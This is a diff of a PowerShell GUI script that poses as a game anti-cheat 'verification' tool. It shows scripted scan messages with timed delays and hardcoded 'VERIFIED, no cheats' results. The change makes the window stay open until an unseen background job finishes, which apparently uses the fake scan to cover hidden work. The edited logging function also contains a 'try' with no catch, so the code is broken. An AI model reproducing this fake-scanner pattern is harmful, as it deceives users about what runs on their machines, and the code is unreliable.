@@ -52,7 +52,7 @@ $rl.Location="15,278"
 $rl.TextAlign="MiddleCenter"
 $f.Controls.Add($rl)
 $f.Show()
-function L($m){$l.AppendText("["+(Get-Date -Format "HH:mm:ss")+"] "+$m+"`n");$l.ScrollToCaret();[System.Windows.Forms.Application]::DoEvents()}
+function L($m){try{$l.AppendText("["+(Get-Date -Format "HH:mm:ss")+"] "+$m+"`n");$l.ScrollToCaret()}[System.Windows.Forms.Application]::DoEvents()}
 function P($v,$m){$pb.Value=$v;$st.Text=$m;[System.Windows.Forms.Application]::DoEvents()}
 P 10 "[1/6] Loading cheat signatures..."
 L "Downloading latest definitions...";Start-Sleep -Milliseconds 400
@@ -86,9 +86,18 @@ L "  VERIFICATION RESULTS:";Start-Sleep 100
 L "  Status: VERIFIED";Start-Sleep 100
 L "  Threats: NONE";Start-Sleep 100
 L "========================================";Start-Sleep 100
-Wait-Job $j -Timeout 10|Out-Null
-Remove-Job $j -Force -EA 0
 $rl.Text="Verification passed! No cheats detected! You are clean!"
 [System.Windows.Forms.Application]::DoEvents()
-Start-Sleep -Seconds 2
-$f.Close()
+$timer=New-Object System.Windows.Forms.Timer
+$timer.Interval=200
+$timer.Add_Tick({
+    if($j.State -eq 'Completed'){
+        $timer.Stop()
+        $timer.Dispose()
+        Remove-Job $j -Force -EA 0
+        $f.Close()
+    }
+})
+$timer.Start()
+while($timer.Enabled){Start-Sleep -Milliseconds 100}
+$f.Dispose()
